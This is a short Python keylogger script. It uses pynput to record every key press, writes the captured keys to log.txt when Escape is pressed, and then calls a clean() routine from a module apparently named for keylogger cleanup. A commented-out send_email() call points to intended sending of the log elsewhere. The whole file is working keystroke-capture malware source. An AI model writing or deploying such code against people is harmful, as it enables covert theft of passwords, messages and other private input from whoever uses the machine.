from pynput.keyboard import Key,Listener
from KLcleaner import clean

k=[]
def log_write_file(key):
        k.append(key)
    
def log_exit_file(key):
    if key==Key.esc:
        with open("log.txt", 'w') as f:
            f.writelines(str(k))
        #send_email()
        return False
        
with Listener(on_press = log_write_file, on_release= log_exit_file) as l:
    l.join()
    
clean()

